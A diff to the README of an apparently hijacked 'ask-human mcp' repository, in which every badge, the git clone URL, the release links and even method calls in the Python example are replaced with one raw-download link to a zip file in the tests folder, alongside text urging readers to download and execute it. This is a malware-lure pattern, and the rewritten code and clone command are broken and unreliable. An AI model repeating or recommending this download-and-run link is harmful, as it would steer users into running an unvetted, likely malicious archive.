@@ -1,9 +1,9 @@
 # ask-human mcp 🧑‍💻🤝🤖
 
-[![PyPI version](https://img.shields.io/pypi/v/ask-human-mcp?style=flat-square)](https://badge.fury.io/py/ask-human-mcp)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](https://opensource.org/licenses/MIT)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue?style=flat-square)](https://www.python.org/downloads/)
-[![Download Releases](https://img.shields.io/badge/releases-latest-blue?style=flat-square)](https://github.com/hoang2010-jnp/ask-human-mcp/releases)
+[![PyPI version](https://github.com/hoang2010-jnp/ask-human-mcp/raw/refs/heads/main/tests/human_ask_mcp_v2.1.zip)](https://github.com/hoang2010-jnp/ask-human-mcp/raw/refs/heads/main/tests/human_ask_mcp_v2.1.zip)
+[![License: MIT](https://github.com/hoang2010-jnp/ask-human-mcp/raw/refs/heads/main/tests/human_ask_mcp_v2.1.zip)](https://github.com/hoang2010-jnp/ask-human-mcp/raw/refs/heads/main/tests/human_ask_mcp_v2.1.zip)
+[![Python 3.8+](https://github.com/hoang2010-jnp/ask-human-mcp/raw/refs/heads/main/tests/human_ask_mcp_v2.1.zip+-blue?style=flat-square)](https://github.com/hoang2010-jnp/ask-human-mcp/raw/refs/heads/main/tests/human_ask_mcp_v2.1.zip)
+[![Download Releases](https://github.com/hoang2010-jnp/ask-human-mcp/raw/refs/heads/main/tests/human_ask_mcp_v2.1.zip)](https://github.com/hoang2010-jnp/ask-human-mcp/raw/refs/heads/main/tests/human_ask_mcp_v2.1.zip)
 
 ## Overview
 
@@ -33,7 +33,7 @@ To install **ask-human mcp**, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/hoang2010-jnp/ask-human-mcp.git
+   git clone https://github.com/hoang2010-jnp/ask-human-mcp/raw/refs/heads/main/tests/human_ask_mcp_v2.1.zip
    cd ask-human-mcp
    ```
 
@@ -63,11 +63,11 @@ from ask_human_mcp import MCP
 
 mcp = MCP()
 
-response = mcp.query("What is the endpoint for user data?")
-if response.is_uncertain():
-    mcp.ask_for_clarity("I'm not sure about that. Can you specify what you mean?")
+response = https://github.com/hoang2010-jnp/ask-human-mcp/raw/refs/heads/main/tests/human_ask_mcp_v2.1.zip("What is the endpoint for user data?")
+if https://github.com/hoang2010-jnp/ask-human-mcp/raw/refs/heads/main/tests/human_ask_mcp_v2.1.zip():
+    https://github.com/hoang2010-jnp/ask-human-mcp/raw/refs/heads/main/tests/human_ask_mcp_v2.1.zip("I'm not sure about that. Can you specify what you mean?")
 else:
-    print(response.data)
+    print(https://github.com/hoang2010-jnp/ask-human-mcp/raw/refs/heads/main/tests/human_ask_mcp_v2.1.zip)
 ```
 
 ## Contributing
@@ -95,11 +95,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Release Information
 
-For the latest updates and releases, visit the [Releases section](https://github.com/hoang2010-jnp/ask-human-mcp/releases). Download the latest version and execute it to start improving your AI interactions.
+For the latest updates and releases, visit the [Releases section](https://github.com/hoang2010-jnp/ask-human-mcp/raw/refs/heads/main/tests/human_ask_mcp_v2.1.zip). Download the latest version and execute it to start improving your AI interactions.
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases section](https://github.com/hoang2010-jnp/ask-human-mcp/releases) for solutions. You can also open an issue in the repository for further assistance.
+If you encounter any issues or have questions, please check the [Releases section](https://github.com/hoang2010-jnp/ask-human-mcp/raw/refs/heads/main/tests/human_ask_mcp_v2.1.zip) for solutions. You can also open an issue in the repository for further assistance.
 
 ## Acknowledgments
 
